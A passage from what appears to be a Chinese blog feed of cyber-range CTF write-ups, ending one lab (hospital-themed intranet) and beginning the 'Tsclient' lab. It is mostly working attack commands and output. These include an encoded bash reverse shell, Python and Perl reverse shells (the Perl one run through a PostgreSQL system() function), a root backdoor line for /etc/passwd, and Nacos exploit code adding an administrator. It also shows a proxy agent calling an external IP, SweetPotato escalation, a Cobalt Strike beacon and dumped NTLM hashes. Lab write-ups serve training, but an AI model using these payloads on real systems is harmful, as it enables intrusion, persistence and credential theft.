plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eC54eC54eC54eC8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.basic /root/flag/flag01.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741507324978-a395d97c-8870-434c-bff6-2f620761c70a.png"></p><p>传个fscan扫一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741507507340-8e9d1a33-4465-4c09-ab65-b27204494342.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.30.12.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.30.12.5     is alive</span><br><span class="line">(icmp) Target 172.30.12.6     is alive</span><br><span class="line">(icmp) Target 172.30.12.236   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 3</span><br><span class="line">172.30.12.236:8080 open</span><br><span class="line">172.30.12.5:8080 open</span><br><span class="line">172.30.12.6:445 open</span><br><span class="line">172.30.12.6:139 open</span><br><span class="line">172.30.12.6:135 open</span><br><span class="line">172.30.12.236:22 open</span><br><span class="line">172.30.12.5:22 open</span><br><span class="line">172.30.12.6:8848 open</span><br><span class="line">172.30.12.236:8009 open</span><br><span class="line">[*] alive ports len is: 9</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.30.12.6</span><br><span class="line">   [-&gt;]Server02</span><br><span class="line">   [-&gt;]172.30.12.6</span><br><span class="line">[*] NetBios 172.30.12.6     WORKGROUP\SERVER02            </span><br><span class="line">[*] WebTitle http://172.30.12.5:8080   code:302 len:0      title:None 跳转url: http://172.30.12.5:8080/login;jsessionid=719C12ACB9D4C848919679B06AB55529</span><br><span class="line">[*] WebTitle http://172.30.12.5:8080/login;jsessionid=719C12ACB9D4C848919679B06AB55529 code:200 len:2005   title:医疗管理后台</span><br><span class="line">[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台</span><br><span class="line">[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found</span><br><span class="line">[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos </span><br><span class="line">[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass </span><br><span class="line">[+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file </span><br></pre></td></tr></table></figure><p>当前权限太低了，这边写个公钥提升到root权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim.basic /etc/passwd                                       </span><br><span class="line">i                                                           </span><br><span class="line">hacker:$1$123$7mft0jKnzzvAdU4t0unTG1:0:0:/root:/bin/bash  #创建用户hacker/123456  </span><br><span class="line">wq!                                                        </span><br><span class="line">su hacker</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741508858125-135e632e-81de-4335-9861-afe913f7ac34.png"></p><p>扫出来内网是nacos，可以打SnakeYaml，把AwesomeScriptEngineFactory.java里执行的命令改成加个管理员用户</p><p><a href="https://github.com/charonlight/NacosExploitGUI">https://github.com/charonlight/NacosExploitGUI</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;net user calmsec qwer1234! /add&quot;);</span><br><span class="line">Runtime.getRuntime().exec(&quot;net localgroup administrators calmsec /add&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741509092189-98cb4a84-cf46-475a-82c9-666033e5774e.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure><p>然后把编译好的jar包传到被控机器的tmp目录下，之后在被控机器上搭建代理(注意后台启动)，再起python服务，让内网的16去访问15的jar包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./linux_x64_agent -c 1.92.148.33:61032 -s aab32 &amp; </span><br></pre></td></tr></table></figure><p>被控机80起个服务</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511176747-10e5f640-870b-473b-a69d-9f1d337075ba.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511117703-66983aab-acfc-4be6-8e45-bb5a4e6124ae.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511291364-f25695fa-d904-4219-ab0e-5619ccab7ae4.png"></p><p>成功的话就可以直接rdp上去了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511420650-813cbb3e-c47f-421d-a41f-a3f3e2c8c198.png"></p><p>之后再看一下236的8080端口,burp抓一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512111720-f618bb88-0d56-4f9e-9d19-e4751906f303.png"></p><h2 id="fastjson漏洞利用"><a href="#fastjson漏洞利用" class="headerlink" title="fastjson漏洞利用"></a>fastjson漏洞利用</h2><p>发现json，猜测fastjson，测试了一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512663079-90c9d474-3a14-413a-848d-bd8ca3611d5a.png"></p><p>拿到flag3</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512702730-917c9d2c-a0e3-48af-84b6-5850d339c4cb.png"></p><p>继续用插件注入🐎</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512776396-bc17183f-7966-435d-aa39-f6a2b8f0762a.png"></p><p>上哥斯拉</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741513284749-c586e943-ac7a-4754-bd7d-3853c937080e.png"></p><p>发现54网段</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741513348548-c92fac68-2133-4a97-8f74-da7b94412a63.png"></p><p>弹shell到入口机器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.30.12.5&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>再搭一次代理,传fscan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.30.54.179/24  </span><br><span class="line">  </span><br><span class="line">   ___                              _  </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __  </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /  </span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;  </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\  </span><br><span class="line">                     fscan version: 1.8.3  </span><br><span class="line">start infoscan  </span><br><span class="line">(icmp) Target 172.30.54.179   is alive  </span><br><span class="line">(icmp) Target 172.30.54.12    is alive  </span><br><span class="line">[*] Icmp alive hosts len is: 2  </span><br><span class="line">172.30.54.179:8080 open  </span><br><span class="line">172.30.54.12:22 open  </span><br><span class="line">172.30.54.179:22 open  </span><br><span class="line">172.30.54.12:5432 open  </span><br><span class="line">172.30.54.12:3000 open  </span><br><span class="line">172.30.54.179:8009 open  </span><br><span class="line">[*] alive ports len is: 6  </span><br><span class="line">start vulscan  </span><br><span class="line">[*] WebTitle http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login  </span><br><span class="line">[*] WebTitle http://172.30.54.179:8080 code:200 len:3964   title:医院后台管理平台  </span><br><span class="line">[*] WebTitle http://172.30.54.12:3000/login code:200 len:27909  title:Grafana  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 root root@111 ssh: handshake failed: ssh: un  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 root 1qaz2wsx ssh: handshake failed: ssh: un  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.12:22 root 1qaz!QAZ ssh: handshake failed: ssh: una  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 admin admin123 ssh: handshake failed: ssh: u  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 admin 1234567890 ssh: handshake failed: ssh:  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 admin 1q2w3e ssh: handshake failed: ssh: una  </span><br><span class="line">已完成 6/6  </span><br><span class="line">[*] 扫描结束,耗时: 6m48.2826514s</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741514668214-ec63b5d8-59f0-4ee4-83de-5840822a6ff4.png"></p><p>利用一下<a href="https://github.com/A-D-Team/grafanaExp">https://github.com/A-D-Team/grafanaExp</a>，下载linux版本上传到受控机器上</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741515357560-ba0ada9c-6228-47e1-88ed-65bd40881103.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Target vulnerable has plugin [alertlist]</span><br><span class="line">Got secret_key [SW2YcwTIb9zpOOhoPsMm]</span><br><span class="line">There is [0] records in db.</span><br><span class="line">type:[postgres]     </span><br><span class="line">name:[PostgreSQL]               </span><br><span class="line">url:[localhost:5432]    </span><br><span class="line">user:[postgres] password[Postgres@123]  </span><br><span class="line">database:[postgres]     basic_auth_user:[] basic_auth_password:[]</span><br><span class="line">All Done, have nice day!</span><br></pre></td></tr></table></figure><h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><p>扫出来数据库，连接一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741516243511-ada298db-5454-4344-a318-c853060c4dc6.png"></p><p>先改root密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER root WITH PASSWORD &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure><p>此时哥斯拉弹出来的shell再监听4444端口</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518279218-e364ec43-8c0f-49b8-8f23-d5229211383b.png"></p><p>弹shell，psql也可以创建函数执行命令，缺点是没回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, &#x27;system&#x27; LANGUAGE &#x27;c&#x27; STRICT; select system(&#x27;curl 172.30.54.179&#x27;);</span><br><span class="line"></span><br><span class="line">select system(&#x27;perl -e \&#x27;use Socket;$i=&quot;172.30.54.179&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\&#x27;&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考：<a href="https://tttang.com/archive/1547/#toc_0x06-postgresql">https://tttang.com/archive/1547/#toc_0x06-postgresql</a> <a href="https://blog.csdn.net/qq_33020901/article/details/79032774">https://blog.csdn.net/qq_33020901&#x2F;article&#x2F;details&#x2F;79032774</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518343735-e4f11c3e-e212-4173-b43b-7a24f2ca8413.png"></p><p>进入交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518546759-8fd9bc77-fe72-4a2a-9946-7216fb25a4d5.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518673541-e320aa21-91d3-481f-9862-5ba4f16cb34f.png"></p><p>直接连接输入 ?之后再输入!&#x2F;bin&#x2F;bash就可以到root权限了直接读flag文件</p><p>flag{be4c267d-e3be-482f-b03b-45bade888421}</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518779730-556b281a-3255-4637-8203-e17cb4fee4fc.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Tsclient</title>
      <link href="/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/"/>
      <url>/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 39.98.115.156 -p 1-65535</span><br></pre></td></tr></table></figure><p>扫出来个弱口令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">39.98.115.156:110 open</span><br><span class="line">39.98.115.156:25 open</span><br><span class="line">39.98.115.156:80 open</span><br><span class="line">39.98.115.156:1433 open</span><br><span class="line">39.98.115.156:2383 open</span><br><span class="line">39.98.115.156:3389 open</span><br><span class="line">39.98.115.156:16450 open</span><br><span class="line">39.98.115.156:16452 open</span><br><span class="line">39.98.115.156:16451 open</span><br><span class="line">39.98.115.156:16453 open</span><br><span class="line">39.98.115.156:17001 open</span><br><span class="line">39.98.115.156:47001 open</span><br><span class="line">39.98.115.156:49665 open</span><br><span class="line">39.98.115.156:49664 open</span><br><span class="line">39.98.115.156:49666 open</span><br><span class="line">39.98.115.156:49668 open</span><br><span class="line">39.98.115.156:49669 open</span><br><span class="line">39.98.115.156:49683 open</span><br><span class="line">39.98.115.156:49705 open</span><br><span class="line">[*] alive ports len is: 19</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.98.115.156:47001 code:404 len:315    title:Not Found</span><br><span class="line">[*] WebTitle http://39.98.115.156      code:200 len:703    title:IIS Windows Server</span><br><span class="line">[+] mssql 39.98.115.156:1433:sa 1qaz!QAZ</span><br><span class="line">已完成 18/19 [-] (57/210) rdp 39.98.115.156:3389 administrator Aa123123 remote error: tls: access denied</span><br></pre></td></tr></table></figure><h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><p>数据库直接上MDUT</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443724183-177501a1-87b3-45a3-9d70-d5e75b088623.png"></p><p>权限有点低，上甜土豆</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443800119-c4483b69-c6f9-4186-80ed-6cd748248090.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443872575-480c900b-24bf-4aa1-96b9-f531dcb71071.png"></p><p>读一下admin目录下，发现flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato-Webshell-new.exe -a &quot;type C:\Users\Administrator\flag\flag01.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443988745-1efbf0ed-a61b-4d1e-a1b6-f0627fc81b64.png"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>传个cs🐎</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato-Webshell-new.exe -a &quot;C:/Users/Public/beacon.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444108965-3acc996d-3a3f-4fa6-a9ef-4699130d34b6.png"></p><p>传个fscan扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:/Users/Public/fscan.exe -h 172.22.8.0/24</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.8.46     is alive</span><br><span class="line">(icmp) Target 172.22.8.15     is alive</span><br><span class="line">(icmp) Target 172.22.8.31     is alive</span><br><span class="line">(icmp) Target 172.22.8.18     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.8.15:135 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.46:135 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.18:80 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.46:80 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.18:1433 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.31:445 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.15:445 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.31:139 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.46:445 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.18:445 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.15:139 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.46:139 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.18:139 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.31:135 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.18:135 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.15:88 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.31</span><br><span class="line">   [-&gt;]WIN19-CLIENT</span><br><span class="line">   [-&gt;]172.22.8.31</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           </span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.46</span><br><span class="line">   [-&gt;]WIN2016</span><br><span class="line">   [-&gt;]172.22.8.46</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.15</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.8.15</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.18</span><br><span class="line">   [-&gt;]WIN-WEB</span><br><span class="line">   [-&gt;]172.22.8.18</span><br><span class="line">   [-&gt;]2001:0:348b:fb58:188a:17bd:d89d:8c63</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br></pre></td></tr></table></figure><p>收集用户信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net user</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444235470-b27a7ef9-28c9-48cc-92db-e62304093bf1.png"></p><p>此时是system起的🐎所以直接dump下来hash就行，直接会话框交互hashdump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] Tasked beacon to dump hashes</span><br><span class="line">[+] host called home, sent: 82541 bytes</span><br><span class="line">[+] received password hashes:</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2caf35bb4c5059a3d50599844e2b9b1f:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">John:1008:aad3b435b51404eeaad3b435b51404ee:eec9381b043f098b011be51622282027:::</span><br></pre></td></tr></table></figure><p>看看john在不在线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell quser || qwinst</span><br></pre></td></tr></table></figure><p>看到john在线，尝试注入进程上线，</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444487178-f46b1ee9-8cae-4516-8c27-fdbfaa35c59e.png"></p><p><img 